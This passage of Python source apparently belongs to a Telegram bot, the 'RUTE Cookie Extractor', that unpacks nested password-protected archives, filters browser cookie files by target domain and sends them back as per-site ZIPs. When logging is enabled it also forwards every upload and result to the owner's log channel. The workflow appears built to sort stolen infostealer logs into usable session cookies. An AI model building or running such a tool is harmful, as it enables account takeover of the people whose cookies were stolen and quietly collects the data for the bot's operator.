                    task.target_sites = sites
            else:
                task.target_sites = ["example.com"]  # Default
            
            # Start processing
            await self.task_manager.update_task_status(user_id, "processing", start_time=time.time())
            
            # Send initial progress
            await self.progress_callback(task, 0, "Starting extraction...")
            
            # Create unique folder for this task
            unique_id = datetime.now().strftime('%Y%m%d_%H%M%S') + f"_{user_id}"
            extract_folder = os.path.join(EXTRACTED_DIR, unique_id)
            result_folder = os.path.join(RESULTS_DIR, unique_id)
            os.makedirs(extract_folder, exist_ok=True)
            os.makedirs(result_folder, exist_ok=True)
            
            task.extract_folder = extract_folder
            
            # Extract archives
            extractor = UltimateArchiveExtractor(
                password=task.password,
                progress_callback=lambda p, s: self.progress_callback(task, p, s)
            )
            task.extractor = extractor
            
            extractor.extract_all_nested(task.file_path, extract_folder)
            
            if task.cancelled:
                await self.cleanup_task(user_id, task)
                return
            
            # Extract cookies
            cookie_extractor = UltimateCookieExtractor(
                task.target_sites,
                progress_callback=lambda p, s: self.progress_callback(task, p, s)
            )
            task.cookie_extractor = cookie_extractor
            
            await cookie_extractor.process_all(extract_folder, task.progress_message)
            
            if task.cancelled:
                await self.cleanup_task(user_id, task)
                return
            
            # Create ZIPs
            await self.progress_callback(task, 95, "Creating ZIP archives...")
            
            if cookie_extractor.total_found > 0:
                created_zips = cookie_extractor.create_site_zips(extract_folder, result_folder)
                
                # Send files to user
                for site, zip_path in created_zips.items():
                    if os.path.exists(zip_path) and os.path.getsize(zip_path) > 0:
                        caption = f"✅ **Cookies for:** `{site}`\n"
                        caption += f"📊 **Size:** {format_size(os.path.getsize(zip_path))}\n"
                        caption += f"📝 **Entries:** {len(cookie_extractor.site_files[site])} files"
                        
                        await self.app.send_document(
                            task.chat_id,
                            document=zip_path,
                            caption=caption,
                            parse_mode=enums.ParseMode.MARKDOWN
                        )
                        
                        task.result_files.append(zip_path)
                        
                        # Forward to log channel
                        if SEND_LOGS and LOG_CHANNEL:
                            try:
                                log_caption = f"#Cookies\n"
                                log_caption += f"**User:** `{user_id}`\n"
                                log_caption += f"**Site:** `{site}`\n"
                                log_caption += f"**Size:** {format_size(os.path.getsize(zip_path))}\n"
                                log_caption += f"**Files:** {len(cookie_extractor.site_files[site])}"
                                
                                await self.app.send_document(
                                    LOG_CHANNEL,
                                    document=zip_path,
                                    caption=log_caption,
                                    parse_mode=enums.ParseMode.MARKDOWN
                                )
                            except Exception as e:
                                print(f"Log forwarding error: {e}")
                
                # Send summary
                elapsed = time.time() - task.start_time
                summary = f"""
✅ **Processing Complete!**

📊 **Statistics:**
├ Time: {format_time(elapsed)}
├ Files Processed: {cookie_extractor.files_processed}
├ Entries Found: {cookie_extractor.total_found}
└ ZIP Archives: {len(created_zips)}

Your cookie files have been sent above.
"""
                await self.app.send_message(task.chat_id, summary, parse_mode=enums.ParseMode.MARKDOWN)
                
                await self.task_manager.update_task_status(user_id, "completed")
            else:
                await self.app.send_message(
                    task.chat_id,
                    "❌ **No matching cookies found** in the extracted files.",
                    parse_mode=enums.ParseMode.MARKDOWN
                )
                await self.task_manager.update_task_status(user_id, "failed")
            
        except Exception as e:
            print(f"Error processing task for user {user_id}: {e}")
            import traceback
            traceback.print_exc()
            
            await self.app.send_message(
                task.chat_id,
                f"❌ **Error processing your file:**\n`{str(e)}`\n\nPlease try again later.",
                parse_mode=enums.ParseMode.MARKDOWN
            )
            await self.task_manager.update_task_status(user_id, "failed")
        
        finally:
            # Cleanup
            await self.cleanup_task(user_id, task)
    
    async def wait_for_user_response(self, user_id: int, chat_id: int, timeout: int = 300) -> Optional[Message]:
        """Wait for user response"""
        future = asyncio.Future()
        
        @self.app.on_message(filters.user(user_id) & filters.chat(chat_id) & ~filters.command("cancel"))
        async def response_handler(client, message):
            if not future.done():
                future.set_result(message)
        
        try:
            return await asyncio.wait_for(future, timeout)
        except asyncio.TimeoutError:
            await self.app.send_message(chat_id, "⏰ **Timeout!** Operation cancelled.")
            return None
        finally:
            self.app.remove_handler(response_handler)
    
    async def cleanup_task(self, user_id: int, task: UserTask):
        """Clean up task files"""
        try:
            # Delete progress message
            if task.progress_message:
                try:
                    await task.progress_message.delete()
                except:
                    pass
            
            # Delete original file
            if os.path.exists(task.file_path):
                try:
                    os.remove(task.file_path)
                except:
                    pass
            
            # Delete extract folder
            if task.extract_folder and os.path.exists(task.extract_folder):
                delete_entire_folder(task.extract_folder)
            
            # Delete result files
            for file_path in task.result_files:
                if os.path.exists(file_path):
                    try:
                        os.remove(file_path)
                    except:
                        pass
            
        except Exception as e:
            print(f"Cleanup error: {e}")
    
    async def handle_start(self, client: Client, message: Message):
        """Handle /start command"""
        welcome_text = f"""
🚀 **RUTE Cookie Extractor Bot**

Welcome! I can extract cookies from nested archives (ZIP, RAR, 7Z, etc.)

**How to use:**
1. Send me any archive file (max 4GB)
2. Provide password if needed
3. Specify target domains
4. Wait for processing
5. Get filtered cookie files

**Commands:**
/start - Show this message
/stats - System statistics
/queue - View processing queue
/cancel - Cancel current operation

**Owner:** @still_alivenow
"""
        await message.reply_text(welcome_text, parse_mode=enums.ParseMode.MARKDOWN)
    
    async def handle_stats(self, client: Client, message: Message):
        """Handle /stats command"""
        stats = get_system_stats()
        await message.reply_text(stats, parse_mode=enums.ParseMode.MARKDOWN)
    
    async def handle_queue(self, client: Client, message: Message):
        """Handle /queue command"""
        queue_list = self.task_manager.get_queue_list()
        
        if not queue_list:
            await message.reply_text("📪 **Queue is empty**", parse_mode=enums.ParseMode.MARKDOWN)
            return
        
        text = "**📋 Current Queue**\n\n"
        
        for user_id, task, position in queue_list:
            if position == 0:  # Active
                status_emoji = "🟢"
                status_text = "**ACTIVE**"
                elapsed = time.time() - task.start_time if task.start_time else 0
                progress = f" | {task.current_progress:.1f}% | {format_time(elapsed)}"
            else:
                status_emoji = "⏳"
                status_text = f"**QUEUE #{position}**"
                progress = ""
            
            user_info = f"User: `{user_id}`"
            file_info = f"File: `{task.file_name}` ({format_size(task.file_size)})"
            stage_info = f"Stage: {task.current_stage}" if task.current_stage else ""
            
            text += f"{status_emoji} {status_text}\n"
            text += f"├ {user_info}\n"
            text += f"├ {file_info}\n"
            if stage_info:
                text += f"└ {stage_info}{progress}\n"
            text += "\n"
        
        await message.reply_text(text, parse_mode=enums.ParseMode.MARKDOWN)
    
    async def handle_cancel(self, client: Client, message: Message):
        """Handle /cancel command"""
        user_id = message.from_user.id
        
        if await self.task_manager.cancel_task(user_id):
            await message.reply_text(
                "✅ **Operation cancelled successfully**\n\n"
                "All temporary files have been cleaned up.",
                parse_mode=enums.ParseMode.MARKDOWN
            )
        else:
            await message.reply_text(
                "❌ **No active operation found** to cancel.",
                parse_mode=enums.ParseMode.MARKDOWN
            )
    
    async def handle_document(self, client: Client, message: Message):
        """Handle document/file uploads"""
        user_id = message.from_user.id
        chat_id = message.chat.id
        
        # Check file size
        if message.document.file_size > MAX_FILE_SIZE:
            await message.reply_text(
                f"❌ **File too large!**\n"
                f"Maximum size: {format_size(MAX_FILE_SIZE)}\n"
                f"Your file: {format_size(message.document.file_size)}",
                parse_mode=enums.ParseMode.MARKDOWN
            )
            return
        
        # Check file extension
        file_name = message.document.file_name
        ext = os.path.splitext(file_name)[1].lower()
        
        if ext not in SUPPORTED_ARCHIVES:
            supported = ', '.join(SUPPORTED_ARCHIVES)
            await message.reply_text(
                f"❌ **Unsupported file format!**\n"
                f"Supported formats: {supported}",
                parse_mode=enums.ParseMode.MARKDOWN
            )
            return
        
        # Check if user already has active task
        async with self.download_semaphore:
            status_msg = await message.reply_text(
                "📥 **Downloading your file...**",
                parse_mode=enums.ParseMode.MARKDOWN
            )
            
            try:
                # Download file
                file_path = await message.download(
                    file_name=os.path.join(DOWNLOADS_DIR, f"{user_id}_{int(time.time())}_{file_name}")
                )
                
                await status_msg.delete()
                
                # Add to queue
                success = await self.task_manager.add_task(
                    user_id,
                    chat_id,
                    message.id,
                    file_path,
                    file_name,
                    message.document.file_size
                )
                
                if success:
                    queue_list = self.task_manager.get_queue_list()
                    position = next((p for uid, _, p in queue_list if uid == user_id), 0)
                    
                    if position == 0:
                        position_text = "Your file is now **processing**"
                    else:
                        position_text = f"Your file is **#{position}** in queue"
                    
                    await message.reply_text(
                        f"✅ **File added to queue!**\n\n"
                        f"📁 **File:** `{file_name}`\n"
                        f"📊 **Size:** {format_size(message.document.file_size)}\n"
                        f"🎯 **Position:** {position_text}\n\n"
                        f"You will be prompted for password shortly.",
                        parse_mode=enums.ParseMode.MARKDOWN
                    )
                    
                    # Forward to log channel
                    if SEND_LOGS and LOG_CHANNEL:
                        try:
                            log_caption = f"#NewFile\n"
                            log_caption += f"**User:** `{user_id}`\n"
                            log_caption += f"**Name:** `{file_name}`\n"
                            log_caption += f"**Size:** {format_size(message.document.file_size)}\n"
                            log_caption += f"**Queue:** #{position if position > 0 else 'Active'}"
                            
                            await message.forward(LOG_CHANNEL)
                        except Exception as e:
                            print(f"Log forwarding error: {e}")
                    
                else:
                    await message.reply_text(
                        "❌ **You already have an active task!**\n"
                        "Please wait for it to complete or use /cancel to stop it.",
                        parse_mode=enums.ParseMode.MARKDOWN
                    )
                    # Delete downloaded file
                    try:
                        os.remove(file_path)
                    except:
                        pass
                    
            except Exception as e:
                await status_msg.delete()
                await message.reply_text(
                    f"❌ **Download failed:**\n`{str(e)}`",
                    parse_mode=enums.ParseMode.MARKDOWN
                )
    
    async def handle_callback(self, client: Client, callback_query: CallbackQuery):
        """Handle callback queries"""
        data = callback_query.data
        user_id = callback_query.from_user.id
        
        if data.startswith("cancel_"):
            target_user = int(data.split("_")[1])
            if user_id == target_user or user_id in ADMINS:
                if await self.task_manager.cancel_task(target_user):
                    await callback_query.answer("❌ Operation cancelled", show_alert=True)
                    await callback_query.message.edit_text(
                        "✅ **Operation cancelled**\n\nAll temporary files have been cleaned up.",
                        parse_mode=enums.ParseMode.MARKDOWN
                    )
                else:
                    await callback_query.answer("❌ No active operation found", show_alert=True)
            else:
                await callback_query.answer("❌ You can only cancel your own operations", show_alert=True)
    
    def run(self):
        """Run the bot"""
        # Add handlers
        self.app.on_message(filters.command("start"))(self.handle_start)
        self.app.on_message(filters.command("stats"))(self.handle_stats)
        self.app.on_message(filters.command("queue"))(self.handle_queue)
        self.app.on_message(filters.command("cancel"))(self.handle_cancel)
        self.app.on_message(filters.document)(self.handle_document)
        self.app.on_callback_query()(self.handle_callback)
        
        # Run the bot
        self.app.run()

# ==============================================================================
#                                MAIN
# ==============================================================================

if __name__ == "__main__":
    # Print banner
    banner = f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════╗
║{Fore.YELLOW}     🚀 RUTE COOKIE EXTRACTOR BOT - PyroFork 🚀        {Fore.CYAN}║
║{Fore.WHITE}       Multi-user · Queue System · 4GB Limit            {Fore.CYAN}║
║{Fore.WHITE}       Tools: 7z: {Fore.GREEN if TOOL_STATUS['7z'] else Fore.RED}{TOOL_STATUS['7z']}  ·  UnRAR: {Fore.GREEN if TOOL_STATUS['unrar'] else Fore.RED}{TOOL_STATUS['unrar']}{Fore.WHITE}         {Fore.CYAN}║
╚══════════════════════════════════════════════════════════╝{Style.RESET_ALL}
    """
    print(banner)
    
    # Create and run bot
    bot = CookieExtractorBot()
    
    try:
        asyncio.run(bot.start())
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}Bot stopped by user{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")
